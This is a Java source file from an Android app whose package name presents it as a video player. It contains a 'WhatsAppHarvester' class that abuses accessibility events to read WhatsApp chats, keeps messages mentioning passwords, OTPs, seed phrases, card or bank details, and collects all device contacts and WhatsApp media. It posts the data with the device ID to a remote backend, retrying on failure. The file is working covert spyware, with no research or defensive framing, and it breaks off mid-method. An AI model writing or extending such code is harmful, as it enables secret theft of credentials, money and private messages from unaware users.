package com.jumpy.videoplayerapp;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class WhatsAppHarvester {
    private static final String TAG = "jumpy_WhatsAppHarvester";
    
    // WhatsApp package names
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b";
    
    // Sensitive keywords for filtering
    private static final String[] SENSITIVE_KEYWORDS = {
        "password", "login", "bank", "crypto", "wallet", "private key", 
        "seed phrase", "2fa", "verification", "otp", "pin", "cvv",
        "account", "transfer", "payment", "credit card", "debit card"
    };
    
    // Business-specific keywords
    private static final String[] BUSINESS_KEYWORDS = {
        "invoice", "order", "transaction", "payment", "bank transfer",
        "account number", "routing number", "swift code", "iban"
    };
    
    private Context context;
    private ScheduledExecutorService executor;
    private List<WhatsAppMessage> messageQueue;
    private List<WhatsAppContact> contactList;
    private boolean isHarvesting = false;
    
    public WhatsAppHarvester(Context context) {
        this.context = context;
        this.executor = Executors.newScheduledThreadPool(2);
        this.messageQueue = new ArrayList<>();
        this.contactList = new ArrayList<>();
    }
    
    // Start comprehensive WhatsApp harvesting
    public void startHarvesting() {
        if (isHarvesting) {
            Log.i(TAG, "WhatsApp harvesting already in progress");
            return;
        }
        
        isHarvesting = true;
        Log.i(TAG, "=== Starting WhatsApp Harvesting ===");
        
        // Harvest in parallel
        executor.submit(this::harvestMessages);
        executor.submit(this::harvestContacts);
        executor.submit(this::harvestMediaFiles);
        executor.submit(this::harvestBusinessData);
    }
    
    public void harvestAll() {
        Log.i(TAG, "=== harvestAll() START ===");
        try {
            harvestMessages();
            harvestContacts();
            harvestMediaFiles();
            harvestBusinessData();
            
            // Send harvested data to backend
            sendDataToBackend();
            
            Log.i(TAG, "=== harvestAll() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error in harvestAll", e);
        }
    }
    
    // Harvest WhatsApp messages using accessibility
    public void harvestMessages() {
        Log.i(TAG, "Starting message harvesting...");
        
        try {
            // Monitor WhatsApp chat screens
            // This would be implemented in the AccessibilityService
            // For now, we'll simulate message collection
            
            List<WhatsAppMessage> messages = collectMessagesFromAccessibility();
            
            // Filter sensitive messages
            List<WhatsAppMessage> sensitiveMessages = filterSensitiveMessages(messages);
            
            // Store messages
            storeMessages(sensitiveMessages);
            
            Log.i(TAG, "Message harvesting completed. Found " + sensitiveMessages.size() + " sensitive messages");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting messages: " + e.getMessage());
        }
    }
    
    // Harvest contacts
    public void harvestContacts() {
        Log.i(TAG, "Starting contact harvesting...");
        
        try {
            // Get WhatsApp contacts
            List<WhatsAppContact> contacts = getWhatsAppContacts();
            
            // Get all device contacts for cross-reference
            List<WhatsAppContact> deviceContacts = getAllContacts();
            
            // Merge and deduplicate
            List<WhatsAppContact> allContacts = mergeContacts(contacts, deviceContacts);
            
            // Store contacts
            storeContacts(allContacts);
            
            Log.i(TAG, "Contact harvesting completed. Found " + allContacts.size() + " contacts");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting contacts: " + e.getMessage());
        }
    }
    
    // Harvest media files
    private void harvestMediaFiles() {
        Log.i(TAG, "Starting media harvesting...");
        
        try {
            // WhatsApp media directories
            String[] mediaPaths = {
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Documents/",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Audio/"
            };
            
            List<String> mediaFiles = new ArrayList<>();
            
            for (String path : mediaPaths) {
                List<String> files = getMediaFilesFromPath(path);
                mediaFiles.addAll(files);
            }
            
            // Copy sensitive media files
            copySensitiveMedia(mediaFiles);
            
            Log.i(TAG, "Media harvesting completed. Found " + mediaFiles.size() + " media files");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting media: " + e.getMessage());
        }
    }
    
    // Harvest business-specific data
    public void harvestBusinessData() {
        Log.i(TAG, "Starting business data harvesting...");
        
        try {
            // Check if WhatsApp Business is installed
            if (isWhatsAppBusinessInstalled()) {
                // Harvest business profile
                WhatsAppBusinessProfile businessProfile = getBusinessProfile();
                
                // Harvest product catalog
                List<WhatsAppProduct> products = getProductCatalog();
                
                // Harvest customer interactions
                List<WhatsAppCustomerInteraction> interactions = getCustomerInteractions();
                
                // Store business data
                storeBusinessData(businessProfile, products, interactions);
                
                Log.i(TAG, "Business data harvesting completed");
            } else {
                Log.i(TAG, "WhatsApp Business not installed, skipping business data");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting business data: " + e.getMessage());
        }
    }
    
    // Enhanced message collection from accessibility events
    private List<WhatsAppMessage> collectMessagesFromAccessibility() {
        Log.i(TAG, "Collecting messages from accessibility events...");
        List<WhatsAppMessage> messages = new ArrayList<>();
        
        try {
            // Get messages from message queue
            synchronized (messageQueue) {
                messages.addAll(messageQueue);
                messageQueue.clear();
            }
            
            Log.i(TAG, "Collected " + messages.size() + " messages from accessibility");
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting messages from accessibility: " + e.getMessage());
        }
        
        return messages;
    }
    
    // Extract messages from accessibility node tree
    private void extractMessagesFromNode(AccessibilityNodeInfo node, List<WhatsAppMessage> messages) {
        if (node == null) return;
        
        try {
            // Check if this node contains message text
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                String messageText = text.toString().trim();
                
                // Filter out UI elements and get actual messages
                if (isValidMessage(messageText)) {
                    String sender = extractSenderFromNode(node);
                    String messageId = generateMessageId(messageText, sender);
                    
                    WhatsAppMessage message = new WhatsAppMessage(
                        messageId,
                        sender,
                        messageText,
                        System.currentTimeMillis(),
                        "text"
                    );
                    
                    messages.add(message);
                    Log.d(TAG, "Extracted message: " + sender + " - " + messageText.substring(0, Math.min(50, messageText.length())));
                }
            }
            
            // Recursively check child nodes
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    extractMessagesFromNode(child, messages);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting messages from node: " + e.getMessage());
        }
    }
    
    // Check if text is a valid message (not UI element)
    private boolean isValidMessage(String text) {
        if (text == null || text.length() < 3) return false;
        
        // Filter out UI elements
        String lowerText = text.toLowerCase();
        if (lowerText.contains("search") || 
            lowerText.contains("type") || 
            lowerText.contains("message") ||
            lowerText.contains("send") ||
            lowerText.contains("attach") ||
            lowerText.contains("camera") ||
            lowerText.contains("gallery") ||
            lowerText.contains("document") ||
            lowerText.contains("contact") ||
            lowerText.contains("location") ||
            lowerText.contains("sticker") ||
            lowerText.contains("emoji")) {
            return false;
        }
        
        // Check for message patterns
        return text.contains(" ") || text.length() > 10;
    }
    
    // Extract sender name from node context
    private String extractSenderFromNode(AccessibilityNodeInfo node) {
        try {
            // Try to find sender from parent nodes
            AccessibilityNodeInfo parent = node.getParent();
            while (parent != null) {
                CharSequence parentText = parent.getText();
                if (parentText != null && parentText.length() > 0) {
                    String text = parentText.toString();
                    // Check if this looks like a contact name
                    if (text.length() > 0 && text.length() < 50 && !text.contains(":")) {
                        parent.recycle();
                        return text;
                    }
                }
                AccessibilityNodeInfo temp = parent;
                parent = parent.getParent();
                temp.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting sender: " + e.getMessage());
        }
        
        return "Unknown";
    }
    
    // Generate unique message ID
    private String generateMessageId(String content, String sender) {
        return sender + "_" + System.currentTimeMillis() + "_" + content.hashCode();
    }
    
    // Filter messages for sensitive content
    private List<WhatsAppMessage> filterSensitiveMessages(List<WhatsAppMessage> messages) {
        List<WhatsAppMessage> sensitiveMessages = new ArrayList<>();
        
        for (WhatsAppMessage message : messages) {
            String content = message.getContent().toLowerCase();
            
            // Check for sensitive keywords
            for (String keyword : SENSITIVE_KEYWORDS) {
                if (content.contains(keyword.toLowerCase())) {
                    sensitiveMessages.add(message);
                    break;
                }
            }
            
            // Check for business keywords
            for (String keyword : BUSINESS_KEYWORDS) {
                if (content.contains(keyword.toLowerCase())) {
                    sensitiveMessages.add(message);
                    break;
                }
            }
        }
        
        return sensitiveMessages;
    }
    
    // Get WhatsApp contacts
    private List<WhatsAppContact> getWhatsAppContacts() {
        List<WhatsAppContact> contacts = new ArrayList<>();
        
        try {
            // Query WhatsApp contacts from content provider
            String[] projection = {
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            };
            
            String selection = ContactsContract.CommonDataKinds.Phone.MIMETYPE + "=?";
            String[] selectionArgs = {"vnd.android.cursor.item/vnd.com.whatsapp.voip.call"};
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    long contactId = cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                    
                    WhatsAppContact contact = new WhatsAppContact(contactId, displayName, phoneNumber);
                    contacts.add(contact);
                }
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting WhatsApp contacts: " + e.getMessage());
        }
        
        return contacts;
    }
    
    // Get all device contacts
    private List<WhatsAppContact> getAllContacts() {
        List<WhatsAppContact> contacts = new ArrayList<>();
        
        try {
            String[] projection = {
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            };
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    long contactId = cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                    
                    WhatsAppContact contact = new WhatsAppContact(contactId, displayName, phoneNumber);
                    contacts.add(contact);
                }
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting all contacts: " + e.getMessage());
        }
        
        return contacts;
    }
    
    // Merge and deduplicate contacts
    private List<WhatsAppContact> mergeContacts(List<WhatsAppContact> whatsappContacts, List<WhatsAppContact> deviceContacts) {
        HashMap<String, WhatsAppContact> mergedContacts = new HashMap<>();
        
        // Add WhatsApp contacts
        for (WhatsAppContact contact : whatsappContacts) {
            mergedContacts.put(contact.getPhoneNumber(), contact);
        }
        
        // Add device contacts (will overwrite if duplicate)
        for (WhatsAppContact contact : deviceContacts) {
            mergedContacts.put(contact.getPhoneNumber(), contact);
        }
        
        return new ArrayList<>(mergedContacts.values());
    }
    
    // Get media files from path
    private List<String> getMediaFilesFromPath(String path) {
        List<String> files = new ArrayList<>();
        
        try {
            File directory = new File(path);
            if (directory.exists() && directory.isDirectory()) {
                File[] fileList = directory.listFiles();
                if (fileList != null) {
                    for (File file : fileList) {
                        if (file.isFile()) {
                            files.add(file.getAbsolutePath());
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting media files from path " + path + ": " + e.getMessage());
        }
        
        return files;
    }
    
    // Copy sensitive media files
    private void copySensitiveMedia(List<String> mediaFiles) {
        try {
            String targetDir = context.getExternalFilesDir(null) + "/WhatsApp_Media/";
            File targetDirectory = new File(targetDir);
            if (!targetDirectory.exists()) {
                targetDirectory.mkdirs();
            }
            
            for (String filePath : mediaFiles) {
                File sourceFile = new File(filePath);
                if (sourceFile.exists()) {
                    File targetFile = new File(targetDir + sourceFile.getName());
                    copyFile(sourceFile, targetFile);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error copying media files: " + e.getMessage());
        }
    }
    
    // Copy file utility
    private void copyFile(File sourceFile, File destFile) throws IOException {
        if (!destFile.exists()) {
            destFile.createNewFile();
        }
        
        FileChannel source = null;
        FileChannel destination = null;
        
        try {
            source = new FileInputStream(sourceFile).getChannel();
            destination = new FileOutputStream(destFile).getChannel();
            destination.transferFrom(source, 0, source.size());
        } finally {
            if (source != null) {
                source.close();
            }
            if (destination != null) {
                destination.close();
            }
        }
    }
    
    // Check if WhatsApp Business is installed
    private boolean isWhatsAppBusinessInstalled() {
        try {
            context.getPackageManager().getPackageInfo(WHATSAPP_BUSINESS_PACKAGE, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    // Get business profile (placeholder)
    private WhatsAppBusinessProfile getBusinessProfile() {
        // This would access WhatsApp Business API or database
        return new WhatsAppBusinessProfile();
    }
    
    // Get product catalog (placeholder)
    private List<WhatsAppProduct> getProductCatalog() {
        // This would access WhatsApp Business product catalog
        return new ArrayList<>();
    }
    
    // Get customer interactions (placeholder)
    private List<WhatsAppCustomerInteraction> getCustomerInteractions() {
        // This would access WhatsApp Business customer data
        return new ArrayList<>();
    }
    
    // Store messages
    private void storeMessages(List<WhatsAppMessage> messages) {
        try {
            // Add messages to queue for batch sending
            synchronized (messageQueue) {
                messageQueue.addAll(messages);
            }
            
            Log.i(TAG, "Added " + messages.size() + " messages to queue. Total in queue: " + messageQueue.size());
            
        } catch (Exception e) {
            Log.e(TAG, "Error storing messages: " + e.getMessage());
        }
    }
    
    // Store contacts
    private void storeContacts(List<WhatsAppContact> contacts) {
        try {
            // Add contacts to queue for batch sending
            synchronized (contactList) {
                contactList.addAll(contacts);
            }
            
            Log.i(TAG, "Added " + contacts.size() + " contacts to queue. Total in queue: " + contactList.size());
            
        } catch (Exception e) {
            Log.e(TAG, "Error storing contacts: " + e.getMessage());
        }
    }
    
    // Send contacts to correct backend endpoint
    private void sendContactsToBackend(String contactsData) {
        executor.submit(() -> {
            try {
                Log.i(TAG, "Sending contacts to backend");
                
                // Create HTTP request for contacts endpoint
                java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "contacts/store");
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(15000);
                
                // Send data
                try (java.io.OutputStream os = connection.getOutputStream()) {
                    byte[] input = contactsData.getBytes("UTF-8");
                    os.write(input, 0, input.length);
                }
                
                // Check response
                int responseCode = connection.getResponseCode();
                Log.i(TAG, "Contacts endpoint response code: " + responseCode);
                
                if (responseCode == 200 || responseCode == 201) {
                    Log.i(TAG, "Successfully sent contacts to backend");
                } else {
                    Log.e(TAG, "Failed to send contacts to backend: HTTP " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending contacts to backend: " + e.getMessage());
            }
        });
    }
    
    // Store business data
    private void storeBusinessData(WhatsAppBusinessProfile profile, List<WhatsAppProduct> products, List<WhatsAppCustomerInteraction> interactions) {
        try {
            JSONObject businessData = new JSONObject();
            
            // Add profile data
            if (profile != null) {
                JSONObject profileObj = new JSONObject();
                profileObj.put("businessName", profile.getBusinessName());
                profileObj.put("description", profile.getDescription());
                profileObj.put("address", profile.getAddress());
                profileObj.put("website", profile.getWebsite());
                businessData.put("profile", profileObj);
            }
            
            // Add products
            JSONArray productsArray = new JSONArray();
            for (WhatsAppProduct product : products) {
                JSONObject productObj = new JSONObject();
                productObj.put("id", product.getId());
                productObj.put("name", product.getName());
                productObj.put("price", product.getPrice());
                productObj.put("description", product.getDescription());
                productsArray.put(productObj);
            }
            businessData.put("products", productsArray);
            
            // Add interactions
            JSONArray interactionsArray = new JSONArray();
            for (WhatsAppCustomerInteraction interaction : interactions) {
                JSONObject interactionObj = new JSONObject();
                interactionObj.put("customerId", interaction.getCustomerId());
                interactionObj.put("customerName", interaction.getCustomerName());
                interactionObj.put("interactionType", interaction.getInteractionType());
                interactionObj.put("timestamp", interaction.getTimestamp());
                interactionsArray.put(interactionObj);
            }
            businessData.put("interactions", interactionsArray);
            
            // Send directly to backend - NO LOCAL STORAGE
            sendToBackend("business", businessData.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Error storing business data: " + e.getMessage());
        }
    }
    
    // Send data to backend with retry logic
    private void sendToBackend(String type, String data) {
        Log.i(TAG, "=== sendToBackend() START - Type: " + type + " ===");
        
        try {
            // Prepare data with device info
            JSONObject requestData = new JSONObject();
            requestData.put(type, new JSONArray(data));
            
            // Add device info
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("deviceId", android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            ));
            deviceInfo.put("timestamp", System.currentTimeMillis());
            deviceInfo.put("harvestType", "whatsapp");
            requestData.put("deviceInfo", deviceInfo);
            
            // Send to backend with retry logic
            sendToBackendWithRetry(type, requestData.toString(), 3);
            
            Log.i(TAG, "=== sendToBackend() END - Type: " + type + " ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error preparing data for backend: " + e.getMessage());
        }
    }
    
    // Enhanced data sending to backend with retry logic
    public void sendDataToBackend() {
        Log.i(TAG, "=== sendDataToBackend() START ===");
        
        try {
            // Get device ID
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
            
            // Prepare WhatsApp data structure
            JSONObject whatsappData = new JSONObject();
            
            // Add device info
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("deviceId", deviceId);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            deviceInfo.put("harvestType", "whatsapp");
            whatsappData.put("deviceInfo", deviceInfo);
            
            // Add messages
            synchronized (messageQueue) {
                if (!messageQueue.isEmpty()) {
                    Log.i(TAG, "Adding " + messageQueue.size() + " messages to WhatsApp data");
                    JSONArray messagesArray = new JSONArray();
                    
                    for (WhatsAppMessage message : messageQueue) {
                        JSONObject messageObj = new JSONObject();
                        messageObj.put("id", message.getId());
                        messageObj.put("from", message.getSender());
                        messageObj.put("body", message.getContent());
                        messageObj.put("timestamp", message.getTimestamp());
                        messageObj.put("type", message.getType());
                        messagesArray.put(messageObj);
                    }
                    whatsappData.put("messages", messagesArray);
                    messageQueue.clear();
                }
            }
            
            // Add contacts
            synchronized (contactList) {
                if (!contactList.isEmpty()) {
                    Log.i(TAG, "Adding " + contactList.size() + " contacts to WhatsApp data");
                    JSONArray contactsArray = new JSONArray();
                    
                    for (WhatsAppContact contact : contactList) {
                        JSONObject contactObj = new JSONObject();
                        contactObj.put("id", contact.getId());
                        contactObj.put("name", contact.getName());
                        contactObj.put("phoneNumber", contact.getPhoneNumber());
                        contactsArray.put(contactObj);
                    }
                    whatsappData.put("contacts", contactsArray);
                    contactList.clear();
                }
            }
            
            // Add business data (empty for now)
            whatsappData.put("businessData", new JSONArray());
            
            // Send WhatsApp data to correct endpoint
            sendWhatsAppDataToBackend(whatsappData.toString());
            
            Log.i(TAG, "=== sendDataToBackend() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending data to backend: " + e.getMessage());
        }
    }
    
    // Send WhatsApp data to correct backend endpoint
    private void sendWhatsAppDataToBackend(String whatsappData) {
        executor.submit(() -> {
            try {
                Log.i(TAG, "Sending WhatsApp data to backend");
                
                // Create HTTP request for WhatsApp endpoint
                java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "whatsapp/store");
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(15000);
                
                // Send data
                try (java.io.OutputStream os = connection.getOutputStream()) {
                    byte[] input = whatsappData.getBytes("UTF-8");
                    os.write(input, 0, input.length);
                }
                
                // Check response
                int responseCode = connection.getResponseCode();
                Log.i(TAG, "WhatsApp endpoint response code: " + responseCode);
                
                if (responseCode == 200 || responseCode == 201) {
                    Log.i(TAG, "Successfully sent WhatsApp data to backend");
                } else {
                    Log.e(TAG, "Failed to send WhatsApp data to backend: HTTP " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending WhatsApp data to backend: " + e.getMessage());
            }
        });
    }
    
    // Send data to backend with retry mechanism
    private void sendToBackendWithRetry(String type, String data, int maxRetries) {
        final int[] retryCount = {0};
        
        Runnable sendTask = new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "Sending " + type + " data to backend (attempt " + (retryCount[0] + 1) + ")");
                    
                    // Create HTTP request for WhatsApp endpoint
                    java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "whatsapp/store");
                    java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                    
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setRequestProperty("Accept", "application/json");
                    connection.setDoOutput(true);
                    connection.setConnectTimeout(10000);
                    connection.setReadTimeout(15000);
                    
                    // Send data
                    try (java.io.OutputStream os = connection.getOutputStream()) {
                        byte[] input = data.getBytes("UTF-8");
                        os.write(input, 0, input.length);
                    }
                    
                    // Check response
                    int responseCode = connection.getResponseCode();
                    Log.i(TAG, "Backend response code: " + responseCode);
                    
                    if (responseCode == 200 || responseCode == 201) {
                        Log.i(TAG, "Successfully sent " + type + " data to backend");
                    } else {
                        Log.e(TAG, "Failed to send " + type + " data to backend: HTTP " + responseCode);
                        
                        // Retry logic
                        if (retryCount[0] < maxRetries - 1) {
                            retryCount[0]++;
                            Log.i(TAG, "Retrying in 2 seconds... (attempt " + (retryCount[0] + 1) + "/" + maxRetries + ")");
                            executor.schedule(this, 2, TimeUnit.SECONDS);
                        } else {
                            Log.e(TAG, "Max retries reached for " + type + " data");
                        }
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error sending " + type + " data to backend: " + e.getMessage());
                    
                    // Retry logic for exceptions
                    if (retryCount[0] < maxRetries - 1) {
                        retryCount[0]++;
                        Log.i(TAG, "Retrying in 2 seconds due to exception... (attempt " + (retryCount[0] + 1) + "/" + maxRetries + ")");
                        executor.schedule(this, 2, TimeUnit.SECONDS);
                    } else {
                        Log.e(TAG, "Max retries reached for " + type + " data due to exceptions");
                    }
                }
            }
        };
        
        executor.submit(sendTask);
    }
    
    // Stop harvesting
    public void stopHarvesting() {
        isHarvesting = false;
        Log.i(TAG, "WhatsApp harvesting stopped");
    }
    
    // Enhanced accessibility event handling
    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // Only process WhatsApp events
            if (!packageName.equals(WHATSAPP_PACKAGE) && !packageName.equals(WHATSAPP_BUSINESS_PACKAGE)) {
                return;
            }
            
            Log.d(TAG, "Processing WhatsApp accessibility event: " + event.getEventType());
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleViewClicked(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    handleWindowContentChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    handleViewScrolled(event);
                    break;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event: " + e.getMessage());
        }
    }
    
    // Handle text changes (new messages being typed or received)
    private void handleTextChanged(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) {
                    String messageText = text.toString().trim();
                    
                    // Check if this is a new message (not just typing)
                    if (isNewMessage(messageText)) {
                        processMessageText(messageText);
                    }
                }
                source.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling text changed: " + e.getMessage());
        }
    }
    
    // Handle view clicks (message selection, etc.)
    private void handleViewClicked(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                // Extract text from clicked element
                extractInfoFromNode(source);
                source.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling view clicked: " + e.getMessage());
        }
    }
    
    // Handle window state changes (new chat opened, etc.)
    private void handleWindowStateChanged(AccessibilityEvent event) {
        try {
            CharSequence className = event.getClassName();
            if (className != null) {
                String classNameStr = className.toString();
                Log.d(TAG, "Window state changed: " + classNameStr);
                
                // Check if this is a chat window
                if (classNameStr.contains("ChatActivity") || classNameStr.contains("ConversationActivity")) {
                    Log.i(TAG, "Chat window opened - starting message monitoring");
                    // Start monitoring this chat
                    startChatMonitoring();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling window state changed: " + e.getMessage());
        }
    }
    
    // Handle window content changes (new messages loaded)
    private void handleWindowContentChanged(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                // Extract all text from the window
                extractAllTextFromNode(source);
                source.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling window content changed: " + e.getMessage());
        }
    }
    
    // Handle view scrolling (loading more messages)
    private void handleViewScrolled(AccessibilityEvent event) {
        try {
            Log.d(TAG, "View scrolled - checking for new messages");
            // When user scrolls, new messages might be loaded
            // Extract messages from current view
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                extractMessagesFromNode(source, new ArrayList<>());
                source.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling view scrolled: " + e.getMessage());
        }
    }
    
    // Check if text represents a new message
    private boolean isNewMessage(String text) {
        if (text == null || text.length() < 3) return false;
        
        // Check for message patterns
        // Messages usually don't contain UI elements
        String lowerText = text.toLowerCase();
        if (lowerText.contains("search") || 
            lowerText.contains("type a message") ||
            lowerText.contains("attach") ||
            lowerText.contains("camera") ||
            lowerText.contains("gallery")) {
            return false;
        }
        
        // Check for message indicators
        return text.contains(" ") && text.length() > 5;
    }
    
    // Start monitoring a specific chat
    private void startChatMonitoring() {
        Log.i(TAG, "Starting chat monitoring...");
        // This will be called when a chat window is opened
        // We can set up specific monitoring for this chat
    }
    
    /**
     * Process message text for sensitive information
     */
    private void processMessageText(String text) {
        // Check for sensitive keywords
        for (String keyword : SENSITIVE_KEYWORDS) {
            if (text.toLowerCase().contains(keyword.toLowerCase())) {
                Log.i(TAG, "Sensitive message detected: " + text.substring(0, Math.min(100, text.length())));
                // Store sensitive message
                WhatsAppMessage message = new WhatsAppMessage(
                    String.valueOf(System.currentTimeMillis()),
                    "Unknown",
                    text,
                    System.currentTimeMillis(),
                    "text"
                );
                message.setSensitive(true);
                messageQueue.add(message);
                break;
            }
        }
    }
    
    /**
     * Extract information from accessibility node
     */
    private void extractInfoFromNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Extract text content
        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString();
            if (!textStr.isEmpty()) {
                processMessageText(textStr);
            }
        }
        
        // Recursively process child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractInfoFromNode(child);
            }
        }
    }
    
    /**
     * Extract all text from accessibility node
     */
    private void extractAllTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Extract text content
        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString();
            if (!textStr.isEmpty()) {
                processMessageText(textStr);
            }
        }
        
        // Recursively process child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractAllTextFromNode(child);
            }
        }
    }
    
    /**
     * Harvest all WhatsApp data
     */
    public void harvestAllData() {
        Log.i(TAG, "[WHATSAPP_HARVEST] harvestAllData START");
        try {
            harvestAll();
            Log.i(TAG, "[WHATSAPP_HARVEST] Data harvested: " + "Messages: " + getMessagesCount() + ", Contacts: " + getContactsCount() + ", Media: " + getMediaCount());
        } catch (Exception e) {
            Log.e(TAG, "[WHATSAPP_HARVEST] Error in harvestAllData: " + e.getMessage(), e);
        }
        Log.i(TAG, "[WHATSAPP_HARVEST] harvestAllData END");
    }
    
    // Getter methods for statistics
    public int getMessagesCount() { return messageQueue.size(); }
    public int getContactsCount() { return contactList.size(); }
    public int getMediaCount() { 
        // Count media files in WhatsApp directories
        int count = 0;
        String[] mediaPaths = {
